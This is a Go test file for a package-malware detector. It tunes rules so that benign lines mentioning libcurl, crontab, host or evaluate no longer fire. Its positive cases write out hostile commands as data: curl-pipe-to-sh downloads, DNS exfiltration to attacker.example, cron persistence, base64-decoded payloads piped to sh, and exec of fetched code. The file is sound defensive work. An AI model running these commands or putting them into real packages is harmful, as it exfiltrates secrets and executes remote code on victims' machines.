package detect

import "testing"

// Four rules matched a keyword with no left boundary or no command context, so they fired
// on words that merely contain it. Each case below is a line production actually minted a
// malware advisory on (2026-10-17 census and replay); the control lines are the shapes the
// rule exists for, and one set was checked against OpenSSF-confirmed packages: every
// P-INSTALL-CURL line in a confirmed package still matches (63 of 63), and the ones that
// stopped matching were `libcurl` option names.

func fires(f []Finding, id string) bool { return has(f, id) || has(f, "IS-"+id) }

func TestURLShortenerNeedsAHostBoundary(t *testing.T) {
	for _, line := range []string{
		`<projectUrl>https://www.paradigm.net.co/</projectUrl>`,                               // "t.co/" inside net.co/
		`url "https://eclecticlight.co/wp-content/uploads/#{version.csv.second.major}/x.zip"`, // light.co/
	} {
		if f := Detect(&PackageContext{Name: "p", Ecosystem: "nuget", PkgbuildContent: line}); fires(f, "P-URL-SHORTENER") {
			t.Errorf("%q matched P-URL-SHORTENER", line)
		}
	}
	for _, line := range []string{
		`curl -sL https://bit.ly/3xAbC | sh`,
		`url = "http://tinyurl.com/api-create.php?url="`,
		`fetch("https://t.co/abc123")`,
	} {
		if f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}); !fires(f, "P-URL-SHORTENER") {
			t.Errorf("%q should match P-URL-SHORTENER; findings=%v", line, ids(f))
		}
	}
}

func TestCronCreateNeedsACommand(t *testing.T) {
	for _, line := range []string{
		`<dependency id="ncrontab" version="3.4.0" exclude="Build,Analyzers" />`,
		`"schedule": {"type": "crontab", "value": self.schedule},`,
		`The worker should be scheduled to run daily via Oban crontab:`,
		`const CRON_STRING_PATH = 'crontab/jobs/factfinder_feed_export/schedule/cron_expr';`,
		`SELECT * FROM s_crontab WHERE action = ?`,
	} {
		if f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}); fires(f, "P-CRON-CREATE") {
			t.Errorf("%q matched P-CRON-CREATE", line)
		}
	}
	for _, line := range []string{
		`(crontab -l; echo "* * * * * /tmp/x") | crontab -`,
		`_current = subprocess.check_output(["crontab", "-l"], stderr=subprocess.DEVNULL).decode()`,
		`send('cron', shell('cat /etc/crontab; ls /var/spool/cron/'))`,
		`echo "*/5 * * * * curl x|sh" > /etc/cron.d/update`,
	} {
		if f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}); !fires(f, "P-CRON-CREATE") {
			t.Errorf("%q should match P-CRON-CREATE; findings=%v", line, ids(f))
		}
	}
}

func TestInstallCurlIsTheCommandNotTheLibrary(t *testing.T) {
	for _, line := range []string{
		`if self.options.with_libcurl or self.options.with_openssl:`,
		`self.output.warning("crashpad needs a shared libcurl library")`,
	} {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "conan", InstallScriptContent: line})
		if fires(f, "P-INSTALL-CURL") {
			t.Errorf("%q matched P-INSTALL-CURL", line)
		}
	}
	for _, line := range []string{
		`curl -s -X POST "https://x.pipedream.net" --data-binary @-`,
		`  curl https://x.example/p.sh | sh`,
		"cd /tmp\ncurl -O http://203.0.113.9/a",
	} {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "npm", InstallScriptContent: line})
		if !fires(f, "P-INSTALL-CURL") {
			t.Errorf("%q should match P-INSTALL-CURL; findings=%v", line, ids(f))
		}
	}
}

func TestDNSExfilNeedsADNSCommand(t *testing.T) {
	for _, line := range []string{
		`throw new \Exception("cannot find host $host");`,
		`'Not attaching bearer token: request host ${request.url.host} does '`,
		`static function make(\Vmwarephp\Vhost $vhost) {`,
	} {
		if f := Detect(&PackageContext{Name: "p", Ecosystem: "packagist", PkgbuildContent: line}); fires(f, "P-DNS-EXFIL") {
			t.Errorf("%q matched P-DNS-EXFIL", line)
		}
	}
	for _, line := range []string{
		`nslookup $(cat /etc/hostname).attacker.example`,
		`dig $DATA.attacker.example TXT`,
		`curl x; host $SECRET.attacker.example`,
	} {
		if f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}); !fires(f, "P-DNS-EXFIL") {
			t.Errorf("%q should match P-DNS-EXFIL; findings=%v", line, ids(f))
		}
	}
}

// P-EVAL-BASE64 was `eval.*base64|base64.*eval`: "eval" with no word boundary matched
// evaluate/evaluation/retrieval, and `.*` let any distance between them count, so a minified
// bundle or a sentence of prose qualified. The tighter form needs the eval CALL and base64
// within one hundred characters. Of 680 distinct recorded lines, 179 still match.
func TestEvalBase64NeedsTheCall(t *testing.T) {
	for _, line := range []string{
		`This function evaluates a base64 payload and returns the result`,
		`| **Cognito** | Evaluation of base64 identity tokens |`,
		`retrieval of the base64 blob happens before the check`,
	} {
		if f := Detect(&PackageContext{Name: "p", Ecosystem: "npm", PkgbuildContent: line}); fires(f, "P-EVAL-BASE64") {
			t.Errorf("%q matched P-EVAL-BASE64", line)
		}
	}
	for _, line := range []string{
		`eval(Buffer.from(payload, 'base64').toString())`,
		`eval("base64.decode('aGVsbG8=')")`,
		`eval ( base64_decode($x) )`,
	} {
		if f := Detect(&PackageContext{Name: "p", Ecosystem: "npm", PkgbuildContent: line}); !fires(f, "P-EVAL-BASE64") {
			t.Errorf("%q should match P-EVAL-BASE64; findings=%v", line, ids(f))
		}
	}
}

// base64 -d and a wallet-shaped constant in library code are CI scripts and blockchain
// constants; only the install hook runs them. OpenSSF-confirmed share of the mints: pypi
// 0.4% and 0.8%.
func TestBase64DecodeAndWalletAreContextInLibraryCode(t *testing.T) {
	for _, line := range []string{
		`echo "$P12_BASE64" | base64 --decode > certificate.p12`,
		`USDC = "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913"`,
	} {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line})
		if CombinedVerdict(f).Malicious {
			t.Errorf("library line %q minted malware; findings=%v", line, ids(f))
		}
	}
	f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: "echo aGk= | base64 -d | sh\n"})
	if !CombinedVerdict(f).Malicious {
		t.Errorf("base64 -d piped to sh in the install hook must mint; findings=%v", ids(f))
	}
}

// PY-SETUP-IMPORTLIB-EXEC counted `exec_module(` as an exec and `re.compile(` as compile,
// so the standard module-by-path loader idiom read as an "obfuscated execution TTP". It was
// the sole evidence for 1,736 of pypi's mints (14%) - the largest single rule - and the three
// packages it minted on 2026-10-17 matched only `spec.loader.exec_module(`.
func TestImportlibExecIgnoresTheModuleLoaderIdiom(t *testing.T) {
	for _, src := range []string{
		"import importlib.util\nspec = importlib.util.spec_from_file_location('v', 'pkg/_version.py')\nmod = importlib.util.module_from_spec(spec)\nspec.loader.exec_module(mod)\n",
		"import importlib, re\nVERSION = re.compile(r'__version__ = \"(.*)\"')\n",
		"import importlib\nm = importlib.import_module('x')\nm.model.eval()\n",
	} {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: src, InstallScriptContent: src})
		if fires(f, "PY-SETUP-IMPORTLIB-EXEC") {
			t.Errorf("benign loader idiom matched PY-SETUP-IMPORTLIB-EXEC:\n%s", src)
		}
	}
	for _, src := range []string{
		"import importlib\nsrc = fetch()\nexec(compile(src, 'x', 'exec'))\n",
		"import imp\nm = imp.load_source('x', p); eval(m.payload)\n",
		"import importlib; exec(importlib.import_module('x').CODE)\n",
	} {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: src})
		if !fires(f, "PY-SETUP-IMPORTLIB-EXEC") {
			t.Errorf("hostile dynamic exec no longer matched:\n%s\nfindings=%v", src, ids(f))
		}
	}
}

// Loading a module from a STAGED path is the hostile shape of the same idiom.
func TestImportlibLoadFromStagedPathStillMints(t *testing.T) {
	src := "import importlib.util\nspec = importlib.util.spec_from_file_location('x', '/tmp/payload.py')\nspec.loader.exec_module(importlib.util.module_from_spec(spec))\n"
	f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: src})
	if !fires(f, "PY-SETUP-IMPORTLIB-EXEC") {
		t.Errorf("a module loaded from /tmp must still match; findings=%v", ids(f))
	}
	ok := "import importlib.util\nspec = importlib.util.spec_from_file_location('v', 'pkg/_version.py')\nspec.loader.exec_module(importlib.util.module_from_spec(spec))\n"
	if fires(Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: ok}), "PY-SETUP-IMPORTLIB-EXEC") {
		t.Error("a module loaded from inside the package must not match")
	}
}
